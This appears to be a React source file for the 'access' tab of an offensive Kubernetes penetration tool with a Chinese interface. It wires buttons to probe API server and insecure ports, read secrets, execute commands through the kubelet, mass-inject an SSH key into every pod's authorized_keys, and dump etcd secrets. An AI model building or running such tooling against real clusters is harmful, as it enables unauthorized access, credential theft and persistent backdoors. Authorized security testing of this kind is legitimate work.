import React, { useEffect, useState } from 'react';
import { Button, Card, Input, Space, Select, Typography, Collapse } from 'antd';
import { ThunderboltOutlined, KeyOutlined } from '@ant-design/icons';
import { api, targetParams, recordTargetStep, PodListSource, PodRecord, PodSelection } from '../services/api';
import ResultView from '../components/ResultView';

interface Props {
  getAuth: () => import('../services/api').AuthConfig;
  addLog: (msg: string) => void;
  activeTarget: string | null;
  onOpenDashboard: () => void;
  onOpenExec: () => void;
  onOpenKubectl: () => void;
  sharedPods: PodRecord[];
  sharedPodSource: PodListSource | null;
  sharedPodSelection: PodSelection | null;
  onSelectSharedPod: (selection: PodSelection | null) => void;
}

export default function AccessTab({ getAuth, addLog, activeTarget, onOpenDashboard, onOpenExec, onOpenKubectl, sharedPods, sharedPodSource, sharedPodSelection, onSelectSharedPod }: Props) {
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [customPath, setCustomPath] = useState('/api/v1/namespaces/default/secrets');
  const [customMethod, setCustomMethod] = useState('GET');
  const [kubeletNs, setKubeletNs] = useState('default');
  const [kubeletPod, setKubeletPod] = useState('');
  const [kubeletCmd, setKubeletCmd] = useState('id');
  const [etcdKey, setEtcdKey] = useState('/registry/secrets/default');
  const [sshPubKey, setSshPubKey] = useState('');
  const [kubeconfigContent, setKubeconfigContent] = useState('');

  useEffect(() => {
    if (!sharedPodSelection) return;
    setKubeletNs(sharedPodSelection.namespace || 'default');
    setKubeletPod(sharedPodSelection.name || '');
  }, [sharedPodSelection?.namespace, sharedPodSelection?.name]);

  const run = async (fn: () => Promise<any>, label: string) => {
    setLoading(true); setResult(null);
    try {
      const r = await fn();
      setResult(r);
      addLog(`[+] ${label} succeeded`);
      recordTargetStep(activeTarget, {
        phase: 'access',
        tool: 'access',
        action: label,
        success: !r?.error,
        summary: r?.error ? `${label} failed: ${r.error}` : `${label} succeeded`,
        data: r,
        output: r?.output || r?.body,
        error: r?.error,
      }).catch(() => {});
    }
    catch (e) {
      setResult({ error: String(e) });
      addLog(`[-] ${label} failed`);
      recordTargetStep(activeTarget, {
        phase: 'access',
        tool: 'access',
        action: label,
        success: false,
        summary: `${label} failed`,
        error: String(e),
      }).catch(() => {});
    }
    finally { setLoading(false); }
  };

  const t = targetParams(getAuth());
  const sharedPodValue = sharedPodSelection ? `${sharedPodSelection.namespace}/${sharedPodSelection.name}` : undefined;
  const sharedPodSourceLabel = sharedPodSource === 'kubelet' ? 'Kubelet' : sharedPodSource === 'kubectl' ? 'kubectl' : 'API Server';

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
      <Card title="API服务器访问" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space>
            <Button danger onClick={() => run(() => api.access.apiServer(t), 'API 服务器 check')}>检测6443</Button>
            <Button onClick={() => run(() => api.access.apiServerInsecure(t), 'Insecure port')}>检测8080</Button>
          </Space>
          <Space style={{ width: '100%' }}>
            <Input placeholder="自定义路径" value={customPath} onChange={(e) => setCustomPath(e.target.value)} style={{ flex: 1 }} />
            <Select value={customMethod} onChange={setCustomMethod} style={{ width: 90 }}
              options={['GET','POST','PUT','DELETE'].map(m => ({ value: m, label: m }))} />
            <Button type="primary" onClick={() => run(() => api.access.apiServerRequest({ ...t, path: customPath, method: customMethod }), '自定义请求')}>发送</Button>
          </Space>
        </Space>
      </Card>
      <Card title="Kubelet访问(10250)" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Button danger onClick={() => run(() => api.access.kubelet(t), 'Kubelet check')}>检测Kubelet</Button>
          {sharedPods.length > 0 ? (
            <Space direction="vertical" style={{ width: '100%' }} size={4}>
              <Typography.Text type="secondary" style={{ fontSize: 10 }}>
                复用已缓存 Pod {sharedPods.length} 个（来源: {sharedPodSourceLabel}）。在命令执行 / kubectl 里选过的 Pod，这里可以直接接着跑。
              </Typography.Text>
              <Select
                allowClear
                showSearch
                value={sharedPodValue}
                placeholder="从共享缓存里选择 Pod"
                optionFilterProp="label"
                style={{ width: '100%' }}
                onClear={() => onSelectSharedPod(null)}
                onChange={(value: string, option: any) => {
                  const parts = value.split('/'); const namespace = parts.length > 1 ? parts[0] : 'default'; const podName = parts.length > 1 ? parts[1] : parts[0];
                  setKubeletNs(namespace);
                  setKubeletPod(podName);
                  onSelectSharedPod({ namespace, name: podName, container: option?.container || undefined });
                }}
                options={sharedPods.map((item) => ({
                  value: `${item.namespace}/${item.name}`,
                  label: `${item.namespace}/${item.name}`,
                  container: item.containers?.split(',').map((entry) => entry.trim()).filter(Boolean)[0],
                }))}
              />
            </Space>
          ) : (
            <Space direction="vertical" style={{ width: '100%' }} size={4}>
              <Typography.Text type="secondary" style={{ fontSize: 10 }}>
                当前还没有共享 Pod 列表。先去命令执行或 kubectl 面板列一次 Pod，这里就能直接复用。
              </Typography.Text>
              <Space size={4}>
                <Button size="small" onClick={onOpenExec}>去命令执行</Button>
                <Button size="small" onClick={onOpenKubectl}>去 kubectl</Button>
              </Space>
            </Space>
          )}
          <Space>
            <Input placeholder="命名空间" value={kubeletNs} onChange={(e) => setKubeletNs(e.target.value)} style={{ width: 100 }} />
            <Input placeholder="Pod name" value={kubeletPod} onChange={(e) => setKubeletPod(e.target.value)} style={{ width: 150 }} />
            <Input placeholder="命令" value={kubeletCmd} onChange={(e) => setKubeletCmd(e.target.value)} style={{ width: 150 }} />
            <Button onClick={() => {
              if (kubeletPod.trim()) {
                onSelectSharedPod({ namespace: kubeletNs || 'default', name: kubeletPod.trim() });
              }
              run(() => api.access.kubeletExec({ ...t, namespace: kubeletNs, pod_name: kubeletPod, command: kubeletCmd }), 'Kubelet exec');
            }}>执行</Button>
          </Space>
          <Collapse ghost size="small" items={[{
            key: 'ssh-inject',
            label: <span style={{ fontSize: 11 }}><KeyOutlined /> 一键SSH密钥注入（批量）</span>,
            children: (
              <Space direction="vertical" style={{ width: '100%' }}>
                <Input.TextArea placeholder="粘贴SSH公钥 (ssh-rsa AAAA...)" value={sshPubKey}
                  onChange={(e) => setSshPubKey(e.target.value)} rows={2} style={{ fontSize: 11, fontFamily: 'monospace' }} />
                <Button danger icon={<KeyOutlined />} disabled={!sshPubKey.trim()}
                  onClick={() => run(() => api.access.kubeletSSH({ ...t, ssh_pub_key: sshPubKey }), 'SSH key injection')}>
                  一键注入SSH密钥（遍历全部Pod）
                </Button>
                <Typography.Text type="secondary" style={{ fontSize: 10 }}>
                  通过 Kubelet API 遍历 Pod/容器，尝试把 SSH 公钥写入容器内的 authorized_keys。结果会显示每个容器的写入状态；只有目标本身运行 sshd 或路径最终落到宿主机时，SSH 登录才真正可用。
                </Typography.Text>
              </Space>
            ),
          }]} />
        </Space>
      </Card>
      <Card title="Etcd访问(2379)" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space wrap>
            <Button danger onClick={() => run(() => api.access.etcdCheck(t), 'Etcd check')}>检测Etcd</Button>
            <Button onClick={() => run(() => api.access.etcdKeys(t), 'Etcd keys')}>列出Key</Button>
            <Button onClick={() => run(() => api.access.etcdV3Keys(t), 'Etcd v3 keys')}>列出V3 Key</Button>
            <Button onClick={() => run(() => api.access.etcdV3SearchSecrets(t), 'Etcd v3 search secrets')}>V3 搜索 Secret</Button>
          </Space>
          <Space>
            <Input placeholder="Key路径" value={etcdKey} onChange={(e) => setEtcdKey(e.target.value)} style={{ width: 250 }} />
            <Button onClick={() => run(() => api.access.etcdRead({ ...t, key: etcdKey }), 'Etcd read key')}>读取</Button>
          </Space>
          <Typography.Text type="secondary" style={{ fontSize: 10 }}>
            同时覆盖 etcd v2/v3 两套常见探测方式；如果 v2 返回空，优先试 v3 列举与 Secret 搜索。
          </Typography.Text>
        </Space>
      </Card>
      <Card title="Dashboard与Kubeconfig" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Button type="primary" icon={<ThunderboltOutlined />} onClick={() => {
            addLog('[+] 跳转到 Dashboard 面板');
            onOpenDashboard();
          }}>
            打开 Dashboard 专用面板
          </Button>
          <Typography.Text type="secondary" style={{ fontSize: 11 }}>
            Dashboard 的发现、探测、Token 提取已经统一收敛到独立的 Dashboard 标签页。
          </Typography.Text>
          <Input.TextArea
            rows={4}
            placeholder="粘贴 Kubeconfig 内容"
            value={kubeconfigContent}
            onChange={(e) => setKubeconfigContent(e.target.value)}
            style={{ fontSize: 11, fontFamily: 'monospace' }}
          />
          <Space>
            <Button disabled={!kubeconfigContent.trim()} onClick={() => run(() => api.access.kubeconfigParse(kubeconfigContent), 'Kubeconfig parse')}>解析Kubeconfig</Button>
            <Button onClick={() => setKubeconfigContent('')}>清空</Button>
          </Space>
        </Space>
      </Card>
      <Card title="输出" size="small" style={{ gridColumn: '1 / -1' }}>
        <ResultView result={result} loading={loading} emptyHint="点击上方按钮执行访问检测" />
      </Card>
    </div>
  );
}
